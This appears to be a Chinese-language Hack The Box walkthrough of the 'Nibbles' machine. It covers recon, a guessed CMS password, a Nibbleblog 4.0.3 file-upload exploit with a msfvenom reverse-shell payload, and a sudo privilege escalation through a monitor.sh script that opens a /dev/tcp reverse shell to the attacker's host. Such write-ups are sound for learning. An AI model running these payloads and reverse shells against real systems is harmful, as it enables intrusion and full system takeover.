# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务发现
```
┌──(root💀kali)-[~/htb/Nibbles]
└─# nmap -sC -sV 10.10.10.75    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-11 03:53 EST
Nmap scan report for 10.10.10.75
Host is up (0.26s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.67 seconds

```

## 目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.10.75 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.75/_21-12-11_03-56-40.txt

Error Log: /root/dirsearch/logs/errors-21-12-11_03-56-40.log

Target: http://10.10.10.75/

[03:56:41] Starting:    
[03:57:40] 200 -   93B  - /index.html                                          
```

只有一个index页面，打开页面显示
> Hello world!

查看网页源代码，有一行注释
> /nibbleblog/ directory. Nothing interesting here!

打开```/nibbleblog/```显示一个博客

python3 dirsearch.py -e* -t 100 -u http://10.10.10.75/nibbleblog

再次爆破这个博客的目录
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.10.75/nibbleblog

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                                                                                                                             
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                                                             
Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.75/-nibbleblog_21-12-11_04-05-45.txt

Error Log: /root/dirsearch/logs/errors-21-12-11_04-05-45.log

Target: http://10.10.10.75/nibbleblog/

[04:05:46] Starting:                              
[04:06:06] 200 -    1KB - /nibbleblog/COPYRIGHT.txt                         
[04:06:08] 200 -    5KB - /nibbleblog/README                                
[04:06:10] 200 -   34KB - /nibbleblog/LICENSE.txt                           
[04:06:11] 301 -  321B  - /nibbleblog/admin  ->  http://10.10.10.75/nibbleblog/admin/
[04:06:12] 200 -    1KB - /nibbleblog/admin.php                             
[04:06:12] 403 -  312B  - /nibbleblog/admin/.htaccess                       
[04:06:12] 200 -    2KB - /nibbleblog/admin/                                
[04:06:12] 200 -    2KB - /nibbleblog/admin/?/login                         
[04:06:13] 200 -    2KB - /nibbleblog/admin/js/tinymce/                     
[04:06:13] 301 -  332B  - /nibbleblog/admin/js/tinymce  ->  http://10.10.10.75/nibbleblog/admin/js/tinymce/
[04:06:29] 400 -  303B  - /nibbleblog/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[04:06:33] 200 -    1KB - /nibbleblog/content/                              
[04:06:33] 301 -  323B  - /nibbleblog/content  ->  http://10.10.10.75/nibbleblog/content/
[04:06:44] 200 -    3KB - /nibbleblog/index.php                             
[04:06:44] 200 -    3KB - /nibbleblog/index.php/login/                      
[04:06:44] 200 -   78B  - /nibbleblog/install.php                           
[04:06:46] 301 -  325B  - /nibbleblog/languages  ->  http://10.10.10.75/nibbleblog/languages/
[04:07:01] 301 -  323B  - /nibbleblog/plugins  ->  http://10.10.10.75/nibbleblog/plugins/
[04:07:02] 200 -    4KB - /nibbleblog/plugins/                              
[04:07:17] 200 -    2KB - /nibbleblog/themes/                               
[04:07:17] 301 -  322B  - /nibbleblog/themes  ->  http://10.10.10.75/nibbleblog/themes/
[04:07:18] 200 -    2KB - /nibbleblog/update.php    
```

这次信息挺丰富，一个个分析

README 文件暴露出cms版本
```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```

admin模块看名字应该是管理登录页面，但是配置错误，现在可以遍历目录里的所有文件，里面各种```.bit```文件查看网页源代码时甚至可以看到php源代码
admin.php是登录页面
content模块也有文件遍历，user.xml文件暴露出一个用户名```admin```,但是找不到密码

如果尝试用下面的命令爆破
> hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^&login=Login:Incorrect username or password."

会触发一个web保护
> Nibbleblog security error - Blacklist protection

上面这条保护规则在```/nibbleblog/admin/boot/rules/4-blacklist.bit```
```
if($_DB_USERS->blacklist())
	exit('Nibbleblog security error - Blacklist protection');
```

所以好像不能爆破。

找到一个config文件```/nibbleblog/content/private/config.xml```

然而没有暴露出密码，但是有一个email：```admin@nibbles.com```

我们猜测是登录的账号是admin，然后使用公司名nibbles登录，发现这个正是密码

获得cms登录凭证：```admin:nibbles```

现在我们有了cms的名字，版本号，已经登录账号，kali搜索这个cms的利用exp

```
┌──(root💀kali)-[~/htb/Nibbles]
└─# searchsploit nibbleblog 4.0.3                                                                                                                                                                                                                                                                                      130 ⨯
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                                                                                             |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                                                                                                                                                                                                      | php/remote/38489.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

# 初始shell
这个payload要使用Metasploit，但是我不想使用这个工具。根据漏洞编号，我在github上找到了[这个python版本的exp](https://github.com/TheRealHetfield/exploits/blob/master/nibbleBlog_fileUpload.py)

按照说明

1. 先编译一个payload,保存在nibble.txt

> msfvenom -p php/reverse_perl --format raw -o nibble.txt LHOST=10.10.14.3 LPORT=4444

2. 修改exp里面的这几行代码，保存
```
nibbleUsername = "admin"
nibblePassword = "nibbles"

nibbleURL = "http://10.10.10.75/nibbleblog/"

```

3. 开启监听
> nc -lnvp 4444

4. 执行攻击
```
┌──(root💀kali)-[~/htb/Nibbles]
└─# python exp.py                                                                                                                                                                                                                                         
[-] LOGIN RESPONSE: 200 OK
[+] Login Successful.
[-] Upload likely successful.
[-] UPLOAD RESPONSE: 200 OK
[+] Exploit launched, check for shell.
[-] EXPLOIT RESPONSE: 200 OK

```

5. 收到反弹shell
```
┌──(root💀kali)-[~/htb/Nibbles]
└─# nc -lnvp 4444                  
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.75] 37284
id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
whoami
nibbler

```


# 提权

查看sudo特权
```
nibbler@Nibbles:/home$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

```

可以执行一个叫monitor.sh的文件

但是这个文件在系统中是不存在的
```
nibbler@Nibbles:/home$ cat /home/nibbler/personal/stuff/monitor.sh
cat /home/nibbler/personal/stuff/monitor.sh
cat: /home/nibbler/personal/stuff/monitor.sh: No such file or directory

```

所以思路很简单，我们创建这个文件，然后反弹一个root shell

1. 准备monitor.sh的内容为：
```
#!/bin/bash
0<&196;exec 196<>/dev/tcp/10.10.14.3/4242; sh <&196 >&196 2>&196

```

2. kali 开启一个新的监听
> nc -lnvp 4242

3. sudo执行
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo  /home/nibbler/personal/stuff/monitor.sh
<er/personal/stuff$ sudo  /home/nibbler/personal/stuff/monitor.sh            
/home/nibbler/personal/stuff/monitor.sh: line 2: 196: Bad file descriptor
```

4. 收到root权限反弹
```
┌──(root💀kali)-[~/htb/Nibbles]
└─# nc -lnvp 4242                                                                                                                                                                                             1 ⨯
listening on [any] 4242 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.75] 43962
id
uid=0(root) gid=0(root) groups=0(root)
whoami        
root

```
